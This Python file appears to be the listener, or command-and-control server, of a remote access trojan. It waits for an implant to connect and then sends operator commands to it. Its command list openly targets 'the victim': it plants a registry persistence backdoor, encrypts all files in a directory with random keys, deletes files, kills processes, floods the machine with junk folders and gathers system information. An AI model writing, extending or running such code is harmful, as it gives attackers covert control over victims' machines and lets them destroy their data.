import socket

cmds = (('getproc', False,
         'Gets the list of running processes.'),

        ('killproc', True,
         'Kills a process with the PID. (You can check pid using \'getproc\').',
         'Usage: killproc [pid]'),

        ('cpupercent', True,
         'Gets the % of cpu usage within a certain amount of seconds.',
         'Usage: cpupercent [time]'),

        ('getsvc', True,
         'Gets the Service(s) Information.',
         'Usage: getsvc [all/name]',),

        ('persistence', False,
         'Implant a persistence backdoor by writing into registry.'),

        ('networkinf', False,
         'Gets the Network Card Information.'),

        ('pwd', False,
         'Prints the current working directory.'),

        ('annoy', True,
         'Annoy the victim by creating (quantity) amount of random folders.',
         'Usage: annoy [quantity]'),

        ('move', True,
         'Moves to the directory.',
         'Usage: move [full path]'),

        ('dir', False,
         'Gets the current directory.'),

        ('getos', False,
         'Gets the Operating System Information.'),

        ('encrypt_files', False,
         'Encrypts all the files in the current directory with random keys.'),

        ('ram', True,
         'Gets the RAM Information.',
         'Usage: ram [info/util]'),

        ('file_deletion', True,
         'Deletes a file/folder at the specific path.',
         'Usage: file_deletion [full path]'),

        ('exit', False,
         'Exits the program.'))

a_cmds = []
for i in cmds:
    a_cmds.append(i[0])

if __name__ == '__main__':
    s = socket.socket()
    host = '0.0.0.0'
    port_is_int = False
    while not port_is_int:
        try:
            port = int(input('Enter Port Number: '))
            port_is_int = True
        except:
            print('Invalid Input!')
    s.bind((host, port))
    s.listen(1)
    print(f"Listening on {host}:{port}")
    conn, addr = s.accept()
    print(f'[+] Client Connected at {addr[0]}:{addr[1]}')
    while True:
        cmd = str(input('Command >> '))
        cmd_verified = False
        split_cmd = cmd.split(' ')
        if split_cmd[0] == 'help':
            if len(split_cmd) > 1:
                if split_cmd[1] in a_cmds:
                    print(f">> {split_cmd[1]}")
                    print(cmds[a_cmds.index(split_cmd[1])][2])  # Description
                    if cmds[a_cmds.index(split_cmd[1])][1]:  # Check the boolean
                        print(cmds[a_cmds.index(split_cmd[1])][3])  # Usage
                else:
                    print(f"Unknown Command '{split_cmd[1]}'")
            else:
                for i in cmds:
                    print(f">> {i[0]}")  # Name
                    print(i[2])  # Description
                    if i[1]:  # Check the boolean
                        print(i[3])  # Usage
                    print()
        elif split_cmd[0] in a_cmds:
            if cmds[a_cmds.index(split_cmd[0])][1]:
                try:
                    check = split_cmd[1]
                    cmd_verified = True
                except:
                    pass
            else:
                cmd_verified = True
        else:
            print('Invalid Command!')
        if cmd_verified:
            conn.send(cmd.encode())
            return_message = conn.recv(51200)  # Wait for reply with 51200 Bytes
            return_message = return_message.decode()  # Decode reply message
            print(f'Reply >> {return_message}')
        else:
            print('Missing Argument!')
            print(cmds[a_cmds.index(split_cmd[0])][3])

        if split_cmd[0] == 'exit':
            exit()
